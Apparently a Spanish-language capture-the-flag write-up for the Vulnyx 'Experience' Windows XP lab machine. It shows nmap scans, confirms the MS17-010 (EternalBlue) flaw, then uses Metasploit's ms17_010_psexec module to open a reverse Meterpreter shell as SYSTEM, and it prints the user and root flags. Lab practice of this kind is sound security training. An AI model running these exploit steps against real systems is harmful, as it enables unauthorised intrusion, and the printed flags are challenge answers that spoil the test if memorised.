---
icon: flag
---

# Experience Vulnyx (Very Easy- Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 03:08 EDT
Nmap scan report for 192.168.5.65
Host is up (0.0017s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
MAC Address: 08:00:27:8D:14:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:8d:14:a0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 13h29m59s, deviation: 4h56m59s, median: 9h59m59s
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-24T10:08:42-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```

Veremos que tiene varios puertos abiertos en concreto el `SAMBA` y el `RPC`, pero vamos a comprobar antes de nada que el `SAMBA` no sea vulnerable a un ataque de `eternal blue` con unos `scripts` de `nmap`.

```shell
nmap -p445 --script=smb-vuln-ms17-010 <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 03:12 EDT
Nmap scan report for 192.168.5.65
Host is up (0.011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:8D:14:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

Veremos que efectivamente es vulnerable, por lo que vamos a conectarnos a `metasploit` para explotarlas desde ahi.

## Metasploit

```shell
msfconsole -q
```

Una vez dentro buscaremos el siguiente modulo:

```shell
use exploit/windows/smb/ms17_010_psexec
```

Ahora vamos a pasar a la `configuracion/Ejecuccion` del mismo:

```shell
set LPORT <PORT>
set LHOST <IP_ATTACKER>
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.50:7755 
[*] 192.168.5.65:445 - Target OS: Windows 5.1
[*] 192.168.5.65:445 - Filling barrel with fish... done
[*] 192.168.5.65:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.5.65:445 -  [*] Preparing dynamite...
[*] 192.168.5.65:445 -          [*] Trying stick 1 (x86)...Boom!
[*] 192.168.5.65:445 -  [+] Successfully Leaked Transaction!
[*] 192.168.5.65:445 -  [+] Successfully caught Fish-in-a-barrel
[*] 192.168.5.65:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 192.168.5.65:445 - Reading from CONNECTION struct at: 0x865963c8
[*] 192.168.5.65:445 - Built a write-what-where primitive...
[+] 192.168.5.65:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.5.65:445 - Selecting native target
[*] 192.168.5.65:445 - Uploading payload... YElfCKTF.exe
[*] 192.168.5.65:445 - Created \YElfCKTF.exe...
[+] 192.168.5.65:445 - Service started successfully...
[*] 192.168.5.65:445 - Deleting \YElfCKTF.exe...
[-] 192.168.5.65:445 - Delete of \YElfCKTF.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
[*] Sending stage (177734 bytes) to 192.168.5.65
[*] Meterpreter session 1 opened (192.168.5.50:7755 -> 192.168.5.65:1028) at 2025-07-24 03:17:39 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Con esto ya veremos que seremos `NT AUTHORITY\SYSTEM` directamente el mayor rando dentro de un equipo `Windows`.

Por lo que vamos a leer las `flags` de usuario y de `root`.

> user.txt

```
f9e24c8da0686680decee9e594178a2e
```

> root.txt

```
c1d5e7e4efece4a6022c4a4080c8114d
```
